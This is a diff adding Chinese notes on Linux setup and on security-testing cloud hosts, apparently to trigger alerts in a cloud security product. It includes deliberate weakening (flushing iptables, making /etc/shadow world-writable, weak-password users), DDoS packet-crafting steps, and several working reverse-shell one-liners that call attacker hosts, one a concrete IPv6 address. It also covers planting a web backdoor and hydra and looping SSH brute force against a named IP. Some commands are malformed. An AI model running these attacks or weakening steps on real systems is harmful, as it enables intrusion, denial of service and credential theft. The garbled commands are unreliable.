@@ -1,0 +1,110 @@
+当系统提示yum没有可下载的软件：cd /home
+
+wget http://dl.fedoraproject.org/pub/epel/6/x86_64/epel-release-6-8.noarch.rpm
+
+rpm -ivh epel-release-6-8.noarch.rpm
+或者
+yum install http://mirrors.hustunique.com/epel//6/x86_64/epel-release-6-8.noarch.rpm
+或者
+yum install epel-release
+linux删除某个软件：yum erase nginx -y 
+远程连接无法连接：
+	客户端bai不能连接duSSH服务的话，那可zhi能是防火墙的原因，你可以将防火墙中的规则条目清除掉：
+	iptables -F
+对等连接连接超时：
+	22端口没有打开。解决办法：查看端口是否打开，lsof -i:端口号 /netstat -aptn——启动ssh服务：/etc/init.d/sshd 		start 或者 service sshd start
+	查看sshd服务是否启动：systemctl status sshd.service
+账号风险测试：
+	“账号未设置过期时间”风险项：chage -m 99999 用户名
+	“未设置密码复杂度限制”风险项：检测/etc/pam.d/system-auth或者/etc/pam.d/common-password。
+	“/etc/shadow权限检查”风险项：666：chmod 666 /etc/shadow
+弱口令测试：
+	创建弱口令用户：useradd 用户名 
+			passwd 密码
+应用风险项：
+	下载MongoDB
+	设置mongodb-org-4.0.repo源：vi /etc/yum.repos.d/mongodb-org-4.0.repo
+		[mongodb-org-4.0]
+		name = MongoDB Repository
+		baseurl = https://repo.mongodb.org/yum/redhat/7/mongodb-org/4.0/x86_64/
+		gpgcheck = 1
+		enabled = 1
+		gpgkey = https://www.mongodb.org/static/pgp/server-4.0.asc
+	安装包：yum install -y mongodb-org
+	启动：systemctl start mongod
+web应用防护：
+	创建站点防护-绑定公网IP-网上搜索本机IP-添加本机IP进入安全组/华南IP进入安全组	
+	apt-get update
+	yum install epel-release
+	yum install nginx
+	vi /etc/nginx/sites-enable/default /   vi /etc/nginx/nginx.conf(在service 配置监听端口)
+	service nginx start/centos 7以上（systemctl start nginx）
+	service nginx restart
+	网页配置地址： /var/www/html/
+DDOS攻击：
+	打开xcap-刷新接口-找到本机IP相应的接口。右击 开启接口
+	
+	destination MAC:   arp -a   填我们的网关的物理地址
+	Source MAC ：ipconfig -all 找到本机ip相应的物理地址
+	Type:使用的协议。
+	Source address：填写本机的IP地址 
+	Destination address:你要攻击的云主机公网IP
+	Protocol ,发送的报文协议
+	抓包:tcpdump -i eth0 udp/tcp
+反弹shell：
+	
+	ipv4
+	被攻击云主机：安装nc，关闭防火墙，监听端口 nc -l -vv 4444/nc -4 -l -vv 4444
+	攻击主机：rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 1234 >/tmp/f
+		bash -i >& /dev/tcp/x.x.x.x/4444 0>&1
+	攻击后，攻击主机看到的是被攻击主机的shell	
+	ipv6
+	攻击主机安装nc，关闭防火墙，并监听端口nc -6 -l -vv 4444
+	被攻击主机运行：
+python -c 'import socket,subprocess,os,pty;s=socket.socket(socket.AF_INET6,socket.SOCK_STREAM);s.connect(("2409:8c20:1833:1102::12",4444,0,2));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=pty.spawn("/bin/sh");'
+		三、反弹shell
+			1、准备两台linux机器
+			2、攻击主机安装nc：yum install nc
+   				  开启监听端口：nc -lvvp 8888
+			3、被攻击主机：bash -i >& /dev/tcp/attckerIP/port 0>&1
+		ipv6反弹shell
+     			攻击端： nc -6 -l 6666 
+ 		windows被攻击端： nc6 -e C:\Windows\System32\cmd.exe xxxx::1 6666 
+     		linux被攻击端： bash -i >& /dev/tcp/xxxx::1/6666 0>&1
+ 
+
+网站后门：
+	启动nginx服务，在路径/usr/share/nginx/html/下放入后门文件
+	点击扫描
+暴力破解：
+第一种方法：使用centos镜像：
+	下载安装包：wget https://github.com/vanhauser-thc/thc-hydra/archive/master.zip
+	安装必要组件：yum -y install gcc libssh-devel openssl-devel
+    		yum install -y unzip zip
+	解压缩：unzip master.zip
+	进入目录：cd thc-hydra-master/
+	编译运行：./configure
+		#make &&make install（centos镜像无法使用make，make install系统没有安装make、vim等常用命令，		直接yum安装下即可）	
+		yum -y install gcc automake autoconf libtool make
+		直接ssh运行，安装make
+		make&make install
+	使用hydra：hydra 对方IP ssh -l 用户名 -P 字典
+		
+
+
+
+
+
+
+第二种方法：	创建文件 login.sh
+	在里面写入
+#!/bin/bash
+
+for ((i=1;1<=100;i++))
+do
+	echo $i times login
+	ssh root@112.33.26.27
+done
+	给予权限：chmod -777 
+	运行login.sh文件：sh login.sh
+
